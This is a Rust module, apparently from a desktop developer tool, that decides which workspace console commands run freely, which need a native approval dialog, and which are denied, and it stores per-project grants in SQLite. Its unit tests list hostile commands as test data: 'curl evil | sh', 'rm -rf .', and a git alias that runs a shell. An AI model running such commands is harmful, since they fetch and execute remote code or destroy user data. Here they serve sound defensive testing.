//! Which workspace console commands may run without asking (C-9).
//!
//! The renderer can request any argument vector through `run_workspace_command`, so a
//! compromised renderer must not become arbitrary local code execution. Commands fall
//! into three groups:
//!
//! - **Allowed**: read-only Git and the usual test, lint, and build entry points of common
//!   toolchains (`npm test`, `cargo check`, `pytest`, ...). Git options that can run
//!   programs (`-c`, `--exec-path`, `--config-env`) are never allowed.
//! - **Needs approval**: anything else. The first run of a program in a project opens a
//!   native confirmation dialog, which the renderer cannot answer on the user's behalf.
//!   Approving remembers that program for that project in the state database, in a table
//!   the renderer's generic state API cannot write.
//! - **Denied**: empty or malformed argument vectors.
use std::path::Path;

#[derive(Debug, PartialEq, Eq)]
pub enum Policy {
    Allowed,
    NeedsApproval { program: String },
    Denied(String),
}

/// The program name used for approvals: the file name without a Windows extension.
pub fn program_name(argv0: &str) -> String {
    let name = Path::new(argv0)
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or(argv0)
        .to_ascii_lowercase();
    for suffix in [".exe", ".cmd", ".bat"] {
        if let Some(stripped) = name.strip_suffix(suffix) {
            return stripped.to_string();
        }
    }
    name
}

const READ_ONLY_GIT: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "rev-parse",
    "ls-files",
    "blame",
    "shortlog",
    "describe",
];
const PACKAGE_SCRIPTS: &[&str] = &[
    "test",
    "lint",
    "build",
    "typecheck",
    "check",
    "format:check",
];

fn allowed_git(args: &[String]) -> bool {
    if args.iter().any(|arg| {
        arg.starts_with("-c")
            || arg.starts_with("--exec-path")
            || arg.starts_with("--config-env")
            || arg.starts_with("--output")
    }) {
        return false;
    }
    match args.first().map(String::as_str) {
        Some(sub) if READ_ONLY_GIT.contains(&sub) => {
            // `git diff --ext-diff` and `--textconv` can run configured helpers.
            !args
                .iter()
                .any(|arg| arg == "--ext-diff" || arg == "--textconv")
        }
        Some("branch") => args[1..].iter().all(|arg| {
            matches!(
                arg.as_str(),
                "--list" | "-a" | "--all" | "-r" | "--remotes" | "-v" | "-vv" | "--show-current"
            )
        }),
        Some("remote") => matches!(
            args.get(1).map(String::as_str),
            Some("get-url") | Some("-v") | None
        ),
        Some("worktree") => args.get(1).map(String::as_str) == Some("list"),
        _ => false,
    }
}

fn allowed_package_manager(args: &[String]) -> bool {
    match args.first().map(String::as_str) {
        Some("test") => true,
        Some("run") => args
            .get(1)
            .map(|script| PACKAGE_SCRIPTS.contains(&script.as_str()))
            .unwrap_or(false),
        _ => false,
    }
}

pub fn classify(argv: &[String]) -> Policy {
    if argv.is_empty()
        || argv.len() > 128
        || argv
            .iter()
            .any(|item| item.len() > 4_000 || item.contains('\0'))
    {
        return Policy::Denied("command arguments are invalid".to_string());
    }
    // Only bare program names resolved through PATH can be allowlisted; an explicit path
    // (for example an uploaded file named `git`) always needs approval, keyed by the path.
    if argv[0].contains('/') || argv[0].contains('\\') {
        return Policy::NeedsApproval {
            program: argv[0].clone(),
        };
    }
    let program = program_name(&argv[0]);
    let args = &argv[1..];
    let allowed = match program.as_str() {
        "git" => allowed_git(args),
        "npm" | "pnpm" | "yarn" | "bun" => allowed_package_manager(args),
        "cargo" => matches!(
            args.first().map(String::as_str),
            Some("test" | "check" | "build" | "fmt" | "clippy")
        ),
        "go" => matches!(
            args.first().map(String::as_str),
            Some("test" | "vet" | "build")
        ),
        "pytest" => true,
        "python" | "python3" => args.len() >= 2 && args[0] == "-m" && args[1] == "pytest",
        "uv" => args.len() >= 2 && args[0] == "run" && args[1] == "pytest",
        "make" => matches!(
            args.first().map(String::as_str),
            Some("test" | "check" | "lint")
        ),
        _ => false,
    };
    if allowed {
        Policy::Allowed
    } else {
        Policy::NeedsApproval { program }
    }
}

pub fn has_grant(
    connection: &rusqlite::Connection,
    project: &str,
    program: &str,
) -> Result<bool, String> {
    connection
        .query_row(
            "SELECT EXISTS (SELECT 1 FROM workspace_command_grants WHERE project = ?1 AND program = ?2)",
            (project, program),
            |row| row.get(0),
        )
        .map_err(|error| error.to_string())
}

pub fn add_grant(
    connection: &rusqlite::Connection,
    project: &str,
    program: &str,
) -> Result<(), String> {
    connection
        .execute(
            "INSERT OR IGNORE INTO workspace_command_grants (project, program) VALUES (?1, ?2)",
            (project, program),
        )
        .map(|_| ())
        .map_err(|error| error.to_string())
}

pub fn list_grants(
    connection: &rusqlite::Connection,
    project: &str,
) -> Result<Vec<String>, String> {
    let mut statement = connection
        .prepare("SELECT program FROM workspace_command_grants WHERE project = ?1 ORDER BY program")
        .map_err(|error| error.to_string())?;
    let rows = statement
        .query_map([project], |row| row.get::<_, String>(0))
        .map_err(|error| error.to_string())?;
    rows.collect::<Result<Vec<_>, _>>()
        .map_err(|error| error.to_string())
}

pub fn remove_grant(
    connection: &rusqlite::Connection,
    project: &str,
    program: &str,
) -> Result<(), String> {
    connection
        .execute(
            "DELETE FROM workspace_command_grants WHERE project = ?1 AND program = ?2",
            (project, program),
        )
        .map(|_| ())
        .map_err(|error| error.to_string())
}

/// The native confirmation text. Shells are called out because approving one allows any
/// command in that project.
pub fn approval_message(project: &str, program: &str, argv: &[String]) -> String {
    let shell = matches!(
        program,
        "sh" | "bash"
            | "zsh"
            | "fish"
            | "dash"
            | "cmd"
            | "powershell"
            | "pwsh"
            | "node"
            | "python"
            | "python3"
            | "ruby"
            | "perl"
    );
    let mut text = format!(
        "Mag Command Center was asked to run `{}` in\n{}\n\nCommand: {}\n\nAllow `{}` in this project? You are asked once per program and project; you can revoke it in the Workspace console.",
        program,
        project,
        argv.join(" "),
        program
    );
    if shell {
        text.push_str(&format!(
            "\n\nWarning: `{program}` can run any code, so approving it allows arbitrary commands in this project."
        ));
    }
    text
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(items: &[&str]) -> Vec<String> {
        items.iter().map(|item| item.to_string()).collect()
    }

    #[test]
    fn common_read_only_and_test_commands_run_without_asking() {
        for command in [
            &["git", "status", "--short"][..],
            &["git", "diff", "--cached"],
            &["git", "remote", "get-url", "origin"],
            &["git", "branch", "--show-current"],
            &["npm", "test"],
            &["npm", "run", "lint"],
            &["pnpm", "run", "typecheck"],
            &["cargo", "check"],
            &["pytest", "-q"],
            &["python3", "-m", "pytest", "tests"],
            &["uv", "run", "pytest"],
            &["go", "test", "./..."],
            &["git.exe", "status"],
        ] {
            assert_eq!(classify(&argv(command)), Policy::Allowed, "{command:?}");
        }
    }

    #[test]
    fn anything_that_can_run_arbitrary_code_needs_approval() {
        for command in [
            &["git", "-c", "alias.x=!sh", "x"][..],
            &["git", "-calias.x=!sh", "x"],
            &["git", "diff", "--ext-diff"],
            &["git", "log", "--output=/tmp/x"],
            &["git", "commit", "-m", "x"],
            &["git", "branch", "-D", "main"],
            &["git", "push"],
            &["npm", "run", "deploy"],
            &["npm", "install"],
            &["npx", "something"],
            &["sh", "-c", "curl evil | sh"],
            &["python3", "-c", "print(1)"],
            &["gh", "pr", "create"],
            &["rm", "-rf", "."],
            &["./.magent/attachments/s/git", "status"],
            &["/usr/bin/git", "log"],
        ] {
            assert!(
                matches!(classify(&argv(command)), Policy::NeedsApproval { .. }),
                "{command:?}"
            );
        }
    }

    #[test]
    fn malformed_argument_vectors_are_denied() {
        assert!(matches!(classify(&[]), Policy::Denied(_)));
        assert!(matches!(
            classify(&argv(&["git", "a\0b"])),
            Policy::Denied(_)
        ));
    }

    #[test]
    fn program_names_ignore_paths_case_and_windows_extensions() {
        assert_eq!(program_name("/usr/local/bin/Docker"), "docker");
        assert_eq!(program_name("PowerShell.EXE"), "powershell");
    }

    #[test]
    fn grants_are_per_project_and_revocable() {
        let connection = rusqlite::Connection::open_in_memory().unwrap();
        crate::initialize_state_schema(&connection).unwrap();
        assert!(!has_grant(&connection, "/a", "docker").unwrap());
        add_grant(&connection, "/a", "docker").unwrap();
        add_grant(&connection, "/a", "docker").unwrap();
        assert!(has_grant(&connection, "/a", "docker").unwrap());
        assert!(!has_grant(&connection, "/b", "docker").unwrap());
        assert_eq!(list_grants(&connection, "/a").unwrap(), vec!["docker"]);
        remove_grant(&connection, "/a", "docker").unwrap();
        assert!(list_grants(&connection, "/a").unwrap().is_empty());
    }

    #[test]
    fn approval_message_warns_about_shells() {
        assert!(approval_message("/p", "bash", &argv(&["bash"])).contains("Warning"));
        assert!(!approval_message("/p", "docker", &argv(&["docker", "ps"])).contains("Warning"));
    }
}
